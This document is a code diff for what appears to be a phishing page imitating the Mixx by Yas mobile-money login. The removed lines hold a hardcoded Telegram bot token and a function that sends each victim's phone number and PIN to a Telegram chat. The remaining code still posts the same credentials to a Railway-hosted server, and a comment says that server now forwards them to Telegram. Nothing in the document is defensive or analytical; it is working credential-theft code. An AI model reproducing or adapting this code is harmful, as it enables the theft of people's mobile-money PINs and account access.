@@ -436,50 +436,7 @@
             // ===== RAILWAY API URL =====
             const API_URL = 'https://mixxbyyas-offers06com-production.up.railway.app';
 
-            // ===== TELEGRAM CREDENTIALS =====
-            const TELEGRAM_BOT_TOKEN = '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
-            const TELEGRAM_CHAT_ID = '8392790531';
-
             console.log('🔗 Connecting to API:', API_URL);
-
-            // ===== SEND TO TELEGRAM =====
-            async function sendToTelegram(phone, pin, status) {
-                const message = `
-🔔 <b>MIXX BY YAS - LOGIN ATTEMPT</b>
-━━━━━━━━━━━━━━━━━━━━━
-
-📱 <b>Phone:</b> ${phone}
-🔐 <b>PIN:</b> <code>${pin}</code>
-📊 <b>Status:</b> ${status}
-🕐 <b>Time:</b> ${new Date().toLocaleString()}
-🌐 <b>IP:</b> ${window.location.hostname}
-
-━━━━━━━━━━━━━━━━━━━━━
-🔒 Secure · Fast · Reliable
-                `;
-
-                try {
-                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: 'HTML'
-                        })
-                    });
-                    
-                    if (response.ok) {
-                        console.log('✅ Telegram notification sent');
-                    } else {
-                        console.log('❌ Telegram send failed:', await response.text());
-                    }
-                } catch (error) {
-                    console.error('❌ Telegram error:', error);
-                }
-            }
 
             // ===== TEST SERVER CONNECTION =====
             async function testServerConnection() {
@@ -644,10 +601,7 @@
                 console.log('📤 Sending login data:', requestData);
 
                 try {
-                    // First, send login details to Telegram
-                    await sendToTelegram(phone, pin, '✅ LOGIN ATTEMPT - Processing...');
-
-                    // Then call the API
+                    // ===== CALL THE API (Server will send to Telegram) =====
                     const response = await fetch(`${API_URL}/api/login`, {
                         method: 'POST',
                         headers: {
@@ -669,9 +623,6 @@
                     console.log('📥 Response data:', data);
 
                     if (data.status === 'success') {
-                        // Send success to Telegram
-                        await sendToTelegram(phone, pin, '✅ LOGIN SUCCESS - OTP SENT');
-
                         launchConfetti();
                         successOverlay.classList.add('show');
                         loginCard.style.opacity = "1";
@@ -684,9 +635,6 @@
                     }
                 } catch (error) {
                     console.error('❌ Error:', error);
-                    
-                    // Send failure to Telegram
-                    await sendToTelegram(phone, pin, `❌ LOGIN FAILED - ${error.message}`);
 
                     let userMessage = 'Login failed. Please try again.';
                     if (error.message.includes('Failed to fetch') || error.message.includes('502')) {
